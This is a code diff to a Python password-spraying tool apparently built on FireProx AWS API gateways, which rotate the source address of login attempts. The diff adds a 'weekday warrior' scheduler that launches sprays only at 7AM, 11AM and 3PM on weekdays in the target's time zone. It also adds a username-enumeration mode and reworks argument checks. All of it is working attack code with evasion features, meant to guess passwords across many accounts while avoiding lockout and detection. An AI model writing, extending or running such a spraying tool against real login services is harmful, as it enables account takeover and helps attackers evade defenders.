@@ -44,6 +44,7 @@ def main(args,pargs):
 	jitter_min = args.jitter_min
 	randomize = args.randomize
 	headers = args.header
+	weekdaywarrior = args.weekday_warrior
 
 
 	# input exception handling
@@ -53,6 +54,7 @@ def main(args,pargs):
 			log_entry("File {} already exists, try again with a unique file name".format(outfile))
 			return
 
+	# AWS Key parsing & Handling
 	if args.config != None:
 		log_entry("Loading AWS configuration details from file: {}".format(args.config))
 		aws_dict = json.loads(open(args.config).read())
@@ -60,11 +62,11 @@ def main(args,pargs):
 		secret_access_key = aws_dict['secret_access_key']
 		profile_name = aws_dict['profile_name']
 		session_token = aws_dict['session_token']
-
 	if access_key is None and secret_access_key is None and session_token is None and profile_name is None:
 		log_entry("No FireProx access arguments settings configured, add access keys/session token or fill out config file")
 		return
 
+	# Utility handling
 	if args.clean:
 		clear_all_apis(access_key, secret_access_key, profile_name, session_token)
 		return
@@ -74,10 +76,8 @@ def main(args,pargs):
 	elif args.api_list:
 		list_apis(access_key, secret_access_key, profile_name, session_token)
 		return
-	elif userpass_file is None and (username_file is None or password_file is None):
-		log_entry("Please provide plugin & username/password information, or provide API utility options (api_list/api_destroy/clean)")
-		return
 
+	# Jitter handling
 	if jitter_min is not None and jitter is None:
 		log_entry("--jitter flag must be set with --jitter-min flag")
 		return
@@ -85,6 +85,13 @@ def main(args,pargs):
 		log_entry("--jitter flag must be greater than --jitter-min flag")
 		return
 
+	# Weekday Warrior options
+	if weekdaywarrior is not None:
+		# kill delay & passwords per delay since this is predefined
+		delay = None
+		passwordsperdelay = 1
+
+	# parse plugin specific arguments
 	pluginargs = {}
 	if len(pargs) % 2 == 1:
 		pargs.append(None)
@@ -105,12 +112,20 @@ def main(args,pargs):
 	else:
 		log_entry("No validate function found for plugin: {}".format(plugin))
 
+	userenum = False
+	if 'userenum' in pluginargs and pluginargs['userenum']:
+		userenum = True
+
+	if userpass_file is None and (username_file is None or (password_file is None and not userenum)):
+		log_entry("Please provide plugin & username/password information, or provide API utility options (api_list/api_destroy/clean)")
+		return
+
+	# Custom header handling
 	if headers is not None:
 		log_entry("Adding custom header \"{}\" to requests".format(headers))
 		head = headers.split(":")[0].strip()
 		val = headers.split(":")[1].strip()
 		pluginargs["custom-headers"] = {head : val}
-
 
 	# this is the original URL, NOT the fireproxy one. Don't use this in your sprays!
 	url = pluginargs['url']
@@ -137,12 +152,30 @@ def main(args,pargs):
 
 		count = 0
 		passwords = ["Password123"]
-		if userpass_file is None:
+		if userpass_file is None and not userenum:
 			passwords = load_file(password_file)
 
 		for password in passwords:
 
-			load_credentials(username_file, password, useragent_file, userpass=userpass_file, randomize=randomize)
+			if weekdaywarrior is not None:
+				spray_days = {
+					0 : "Monday",
+					1 : "Tuesday",
+					2 : "Wednesday",
+					3 : "Thursday",
+					4 : "Friday",
+				    5 : "Saturday",
+				    6 : "Sunday" ,
+				}
+
+				weekdaywarrior = int(weekdaywarrior)
+				sleep_time = ww_calc_next_spray_delay(weekdaywarrior)
+				next_time = datetime.datetime.utcnow() + datetime.timedelta(hours=weekdaywarrior) + datetime.timedelta(minutes=sleep_time)
+				log_entry("Weekday Warrior, sleeping {delay} minutes until {time} on {day} in UTC {utc}".format(delay=sleep_time,time=next_time.strftime("%H:%M"),day=spray_days[next_time.weekday()], utc=weekdaywarrior))
+				time.sleep(sleep_time*60)
+
+
+			load_credentials(username_file, password, userenum, useragent_file, userpass=userpass_file, randomize=randomize)
 
 			# Start Spray
 			threads = []
@@ -159,6 +192,8 @@ def main(args,pargs):
 			if delay is None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
 				if userpass_file != None:
 					log_entry('Completed spray with user-pass file {} at {}'.format(userpass_file, datetime.datetime.utcnow()))
+				elif userenum:
+					log_entry('Completed userenum at {}'.format(datetime.datetime.utcnow()))
 				else:
 					log_entry('Completed spray with password {} at {}'.format(password, datetime.datetime.utcnow()))
 				continue
@@ -348,8 +383,8 @@ def spray_thread(api_key, api_dict, plugin, pluginargs, jitter=None, jitter_min=
 
 			response = plugin_authentiate(api_dict['proxy_url'], cred['username'], cred['password'], cred['useragent'], pluginargs)
 
-			if "debug" in response.keys():
-				print(response["debug"])
+			# if "debug" in response.keys():
+			# 	print(response["debug"])
 
 			if not response['error']:
 				log_entry("{}: {}".format(api_key,response['output']))
@@ -364,14 +399,17 @@ def spray_thread(api_key, api_dict, plugin, pluginargs, jitter=None, jitter_min=
 			log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],ex))
 
 
-def load_credentials(user_file, password, useragent_file=None, userpass=None, randomize=False):
+def load_credentials(user_file, password, userenum, useragent_file=None, userpass=None, randomize=False):
 
 	r = ""
 	if randomize:
 		r = ", randomized order"
 
 	users = []
-	if userpass is None:
+	if userenum:
+		log_entry('Loading users and useragents{}'.format(r))
+		users = load_file(user_file)
+	elif userpass is None:
 		log_entry('Loading credentials from {} with password {}{}'.format(user_file, password, r))
 		users = load_file(user_file)
 	else:
@@ -423,6 +461,52 @@ def load_file(filename):
 		return [line.strip() for line in open(filename, 'r')]
 
 
+def ww_calc_next_spray_delay(offset):
+
+	spray_times = [7,11,15] # launch sprays at 7AM, 11AM and 3PM
+
+	now = datetime.datetime.utcnow() + datetime.timedelta(hours=offset)
+	hour_cur = int(now.strftime("%H"))
+	minutes_cur = int(now.strftime("%M"))
+	day_cur = int(now.weekday())
+
+	delay = 0
+
+	# if just after the spray hour, use this time as the start and go
+	if hour_cur in spray_times and minutes_cur <= 59:
+		delay = 0
+		return delay
+
+	next = []
+
+	# if it's Friday and it's after the last spray period
+	if (day_cur == 4 and hour_cur > spray_times[2]) or day_cur > 4:
+		next = [0,0]
+	elif hour_cur > spray_times[2]:
+		next = [day_cur+1, 0]
+	else:
+		for i in range(0,len(spray_times)):
+			if spray_times[i] > hour_cur:
+				next = [day_cur, i]
+				break
+
+	day_next = next[0]
+	hour_next = spray_times[next[1]]
+
+	if next == [0,0]:
+		day_next = 7
+
+	hd = hour_next - hour_cur
+	md = 0 - minutes_cur
+	if day_next == day_cur:
+		delay = hd*60 + md
+	else:
+		dd = day_next - day_cur
+		delay = dd*24*60 + hd*60 + md
+
+	return delay
+
+
 def log_entry(entry):
 
 	global lock
@@ -456,6 +540,7 @@ if __name__ == '__main__':
 	parser.add_argument('-d', '--delay', type=int, required=False, help='Delay between unique passwords, in minutes')
 	parser.add_argument('-r', '--randomize', required=False, action="store_true", help='Randomize the input list of usernames to spray (will remain the same password)')
 	parser.add_argument('--header', default=None, required=False, help='Add a custom header to each request for attribution, specify "X-Header: value"')
+	parser.add_argument('--weekday-warrior', default=None, required=False, help="If you don't know what this is don't use it, input is timezone UTC offset")
 	parser.add_argument('--passwordsperdelay', type=int, default=1, required=False, help='Number of passwords to be tested per delay cycle')
 	parser.add_argument('--profile_name', type=str, default=None, help='AWS Profile Name to store/retrieve credentials')
 	parser.add_argument('--access_key', type=str, default=None, help='AWS Access Key')
